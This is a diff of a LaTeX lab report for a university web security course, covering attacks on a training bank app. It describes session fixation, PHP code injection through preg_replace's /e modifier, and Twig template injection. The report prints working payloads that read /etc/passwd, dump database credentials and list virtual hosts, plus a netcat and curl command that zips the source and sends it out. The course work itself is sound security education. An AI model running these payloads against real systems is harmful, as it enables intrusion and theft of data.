@@ -49,7 +49,7 @@
 		\LARGE {\tt Group 5}\\}
 	\date{}
 	\author{
-		 \\
+		\\
 		Abhijeet Patil \\
 		Mohammad Saiful Islam\\
 		Thejeswi Preetham Nagendra Kamatchi}
@@ -57,54 +57,65 @@
 	\newpage
 	
 	\section*{Exercise 1: Session Fixation}
-	The security team of the bank is working overtime to fix all the wholes you discovered and exploited. Assume
+	The security team of the bank is working overtime to fix all the holes you discovered and exploited. Assume
 	that they were successful in disabling all vulnerabilities which you exploited using JavaScript. Further, assume
-	that you can’t steal cookies anymore. Is there still a way to get access to an account of a user?
+	that you cannot steal cookies anymore. Is there still a way to get access to an account of a user?
 	
 	\paragraph*{1.}{\bf Sketch an attack that allows you to take over the session of a bank user.}\\
 	\begin{itemize}
-	
-		\item[a] When we visit the bank application with a browser a cookie with the key ''USECURITYID''. This key has a random hexadecimal value assigned to it.
+		
+		\item[a] We visit the bank application with a cookie with the key ''USECURITYID''. This key has a random hexadecimal value assigned to it.
 		\item[b] We send a money transfer to the victim's account with a meta tag in the remark. The meta tag looks like: <meta http-equiv="Set-Cookie" content="USECURITYID=abc path=/''>
-		\item[c] Now when the victim visits his accounts page and his session has been replaced with a different session or ''USECURITYID''.
+		\item[c] Now when the victim visits his accounts page, his session has been replaced with a different session or ''USECURITYID''.
 		\item[d] The attacker now visits the bank application with his ''USECURITYID'' manually set to the same one as the victim and thus can access his account.
 	\end{itemize}
 	
-	\paragraph*{2.}{\bf 2. How can you generally verify that an application is vulnerable to this kind of attack?}\\
+	\paragraph*{2.}{\bf  How can you generally verify that an application is vulnerable to this kind of attack?}\\
 	
 	\begin{itemize}
-			
+		
 		\item[a] Copy the security token from one browser and paste it in another browser.
 		\item[b] Login from the second browser.
 		\item[c] Refresh the page in the first browser, if the page is logged in to the account with which user logged in to the second browser, the application is vulnerable to session fixation.
 	\end{itemize}
-
-	\paragraph*{3.}{\bf 3. Does https influence your attack?}\\
+	
+	\paragraph*{3.}{\bf Does https influence your attack?}\\
 	
 	https does not influence this attack.
 	
-	\paragraph*{4.}{\bf Accordingly, which countermeasure is necessary to prevent your attacks? Patch your system and test it against session fixation again.}\\
+	\paragraph*{4.}{\bf Accordingly, which countermeasure are necessary to prevent your attacks? Patch your system and test it against session fixation again.}\\
 	
 	A counter measure to prevent this attack is:
 	
 	\begin{itemize}
 		\item[i] Generating new tokens every request.
 		\item[ii] Removing tags from user inputs.
+		\item[iii] Regenerating session ID when session state changes.
+		
 	\end{itemize}
-		
-		
+	
+	
 	\section*{Exercise 2: Remote code injection}
 	
 	At this point you are quite familiar with the user interface of your bank application.
 	
 	\paragraph*{1.}{\bf Find a section that allows you to inject and execute arbitrary code (PHP). Document your steps and explain why does it allow the execution?}\\
 	
-	The section that executes arbitrary PHP code is in the ''htbdetails'' details page of the vBank application. There in the search field we enter the string {\sf '.system("uptime\%3Bid").'}
+	The section that executes arbitrary PHP code is in the ''htbdetails'' details page of the vBank application. There, in the search field we enter the string {\sf '.system("uptime\%3Bid").'}
 	
 	\begin{figure}[H]
-	\includegraphics[width=.75\textheight,height=0.4\textheight]{images/2_1.jpg}
-	\caption{vulnerable section}
+		\includegraphics[width=.75\textheight,height=0.4\textheight]{images/2_1.jpg}
+		\caption{vulnerable section}
 	\end{figure}
+	
+	\paragraph*  - The input vector field for submit query on the account details page is  vulnerable to code injection. The user input value to query is stored in replaceWith. Further, replaceWith is stored in transfersStr. preg replace is used to sanitize the user input. But preg replace uses the e modifier. 
+	
+	\paragraph* -Most modifiers are quite harmless and let you do things like case-insensitive and multi-line searches, however one modifier, e will cause PHP to execute the result of the pregreplace operation as PHP code. Setting the e regex modifier will cause PHP to execute the replacement value as code.
+	
+	\paragraph* -To exploit the code, all the attacker has to do is provide some PHP code to execute, generate a regular expression which replaces some or all of the string with the code, and set the e modifier on the regular expression.
+	
+	\paragraph* -It has been deprecated in later revisions (PHP >= 5.5.0) due to its recklessly insecure nature. 
+	
 	
 	\paragraph*{2.}{\bf Disclose the master password for the database your bank application has access to. Indicate username, password and DB name as well as the IP address of the machine this database is running on.}\\
 	
@@ -112,7 +123,7 @@
 	We use this as our query: '.var\_dump(get\_defined\_vars()).'
 	
 	\begin{figure}[H]
-		\includegraphics[width=.75\textheight]{images/2_2.jpg}
+		\includegraphics[width=.7\textheight,height=.3\textheight]{images/2_2.jpg}
 		\caption{retrieving useful Database information }
 	\end{figure}
 	
@@ -120,14 +131,19 @@
 	
 	\paragraph*{3.}{\bf Explain how you can display the php settings of your webserver! Which information is relevant for the attacker ?}\\
 	
-	In the query field we can use '.phpinfo(INFO\_GENERAL).' to get a section of the php settings relevant to us. We use the flag INFO\_GENERAL to narrow down on the information more useful to the attacker.
+	In the query field we can use '.phpinfo(INFO\_GENERAL).' to get a section of the php settings relevant to us. We use the flag INFO\_GENERAL to narrow down on the information more useful to the attacker. In this case an attacker can get information regarding the include path, the web root directory, etc which could be then used to retrieve sensitive information from the files.
+	
 	
 	\begin{figure}[H]
 		\includegraphics[width=.75\textheight]{images/2_3.jpg}
 		\caption{Displaying phpinfo}
 	\end{figure}
-
+	
 	\paragraph*{4.}{\bf Assume you are running a server with virtual hosts. Can you disclose the password for another bank database	and can you access it? Explain. Which potential risk does this vulnerability imply for virtual hosts?}\\
+	
+	Yes, it is possible to access the master password for the database of another bank if we get access to the config file of the specific application.There is no mechanism to secure the application. So the virtual hosts will be affected. 
+	
+	The attacker could perform all attacks that we performed in this task considering that the vulnerabilities were not removed. Virtual hosts are maintained by the servers to host numerous websites. If the information about virtual hosts are exposed, then sites too can be exploited. 
 	
 	We first have to list all the virtual hosts configured on the server. With the command apache2ctl -S we can list them. So the query will be {\sf '.system(''apache2ctl -S'').'} 
 	
@@ -136,30 +152,30 @@
 		\caption{exposing virtual hosts.}
 	\end{figure}
 	
-	Virtual hosts are maintained by the servers to host numerous websites. If the information of virtual host are exposed, then other sites are also in danger of exploiting.
+	
 	
 	\paragraph*{5.}{\bf Display /etc/passwd of the web server, the bank application is running on. Try different methods to	achieve this goal. Explain why some methods cannot be successful.} \\
 	
 	With the command {\sf '.system("cat /etc/passwd").'} in the search field, the passwd file can be displayed. 
 	
 	\begin{figure}[H]
-		\includegraphics[width=.75\textheight]{images/2_5.jpg}
+		\includegraphics[width=.7\textheight,height=.3\textheight]{images/2_5.jpg}
 		\caption{displaying /etc/passwd.}
 	\end{figure}
-	 
+	
 	\paragraph*{6.}{\bf Show how to ''leak'' the complete source files of your web application. Briefly describe, how you accomplished this.}\\
-	 
+	
 	\begin{itemize}
-	 	
-	 	\item[a] On the attacker's computer we use: {\sf nc -vlp 6666 > vbank.zip}
-	 	\item[b] query= {\sf '.system("zip -q -r /tmp/vbank.zip ../*; curl -F 'data=@/tmp/vbank.zip;' http://0.0.0.0:6666").'}
-	 	\item[c] The attacker receives the file.
-	 	
+		
+		\item[a] On the attacker's computer we use: {\sf nc -vlp 6666 > vbank.zip}
+		\item[b] query= {\sf '.system("zip -q -r /tmp/vbank.zip ../*; curl -F 'data=@/tmp/vbank.zip;' http://0.0.0.0:6666").'}
+		\item[c] The attacker receives the file.
+		
 	\end{itemize}
-	 
+	
 	\begin{figure}[H]
-	 	\includegraphics[width=.75\textheight]{images/2_6.jpg}
-	 	\caption{leaked source files.}
+		\includegraphics[width=.75\textheight]{images/2_6.jpg}
+		\caption{leaked source files.}
 	\end{figure}
 	
 	\paragraph*{7.}{\bf Suppose you are an anonymous attacker:
@@ -167,7 +183,7 @@
 			\item Upload a web shell on the victim server and show that you can take control of the server.
 			\item Deface the main bank page.
 			\item Clear possible traces that could lead to you.
-		\end{itemize} }
+	\end{itemize} }
 	
 	To upload a shell,\\
 	
@@ -213,10 +229,10 @@
 		\includegraphics[width=0.75\textheight]{images/3_1.jpg}
 		\caption{vulnerable webapp.}
 	\end{figure}
-
+	
 	\paragraph*{2.}{\bf Can you find any interesting files. Note down those files.}\\
 	
-	We have used a scanning tool,'nikto', to look for files. We find following:
+	We have used a scanning tool,'nikto', to look for files. We found following:
 	
 	\begin{figure}[H]
 		\includegraphics[width=0.75\textheight,height=.4\textheight]{images/3_2_1.jpg}
@@ -231,8 +247,8 @@
 	It seems the file contains the location of the flag, key and initializing vector to decrypt it.
 	
 	\paragraph*{3.}{\bf Now it is time for the actual task, find a Remote Code Execution - RCE vulnerability and use it to execute commands on the server.\\
-	Hint: What are web-templates ?!}\\
-
+		Hint: What are web-templates ?!}\\
+	
 	Looking at the hint, we assume that the webapp was developed using web-templates. Web applications frequently use template systems such as FreeMarker and Twig to embed dynamic content in web pages. When users input is embedded in a template in an unsafe manner, it would be vulnerable to Remote Code Execution.\\
 	
 	At this point we do not know which template was used in the webapp. We have found there is an injection point 'hname' field. We tried several combination and 'hname=\{\{7*7\}\}' worked, meaning 7*7 was ran and resulted 49. From which we can say that the template 'twig' was used.
@@ -241,7 +257,7 @@
 		\includegraphics[width=0.75\textheight]{images/3_3_1.jpg}
 		\caption{Template 'twig' was found.}
 	\end{figure}
-
+	
 	Twig's {\sf \_self} object has an {\sf 'env'} attribute, which refers to {\sf Twig\_Environment} object. The method {\sf registerUndefinedFilterCallback()} of {\sf 'env'} object can be used to registering {\sf 'exec'} or {\sf 'system'} command, and the {\sf getFilter()} method can be used to pass the command we want to execute.\\
 	
 	\paragraph*{4.}{\bf You succeeded to execute commands on the server side. Which user did you compromise?}
